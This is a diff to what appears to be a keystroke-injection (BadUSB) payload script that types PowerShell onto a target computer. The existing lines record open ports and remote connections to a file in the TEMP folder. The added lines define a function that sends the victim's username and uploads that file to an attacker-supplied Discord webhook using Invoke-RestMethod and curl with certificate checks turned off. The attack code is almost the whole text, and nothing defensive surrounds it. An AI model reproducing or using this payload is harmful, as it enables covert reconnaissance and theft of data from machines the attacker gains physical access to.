@@ -16,6 +16,44 @@ STRING "`nOPEN PORTS: $currentNumber" | Out-File -FilePath $filePath
 ENTER
 STRING $openPorts | %{$portCount=1}{$port=$_;($connections|?{$_.LocalPort -eq $port}).RemotePort|select -Unique|%{"`n$portCount. [Local Port]: $port <--> [Remote Port]: $_" | Out-File -FilePath $filePath -Append;$portCount++}}
 ENTER
+STRING function Upload-Discord {
+ENTER
+STRING [CmdletBinding()]
+ENTER
+STRING param (
+ENTER
+STRING [parameter(Position=0,Mandatory=$False)]
+ENTER
+STRING [string]$file,
+ENTER
+STRING [parameter(Position=1,Mandatory=$False)]
+ENTER
+STRING [string]$text
+ENTER
+STRING )
+ENTER
+STRING $hookurl = 'YOUR WEBOKK HERE'
+ENTER
+STRING $Body = @{
+ENTER
+STRING 'username' = $env:username
+ENTER
+STRING 'content' = $text
+ENTER
+STRING }
+ENTER
+STRING if (-not ([string]::IsNullOrEmpty($text))){
+ENTER
+STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)};
+ENTER
+STRING if (-not ([string]::IsNullOrEmpty($file))){curl.exe --insecure -F "file1=@$file" $hookurl}
+ENTER
+STRING }
+ENTER
+STRING Upload-Discord -file "$env:TEMP\CaliPortsOpen_$env:COMPUTERNAME_$(Get-Date -Format 'yyyyMMdd').txt"
+ENTER
+STRING exit
+ENTER
 DELAY 200
 STRING exit
 DELAY 500
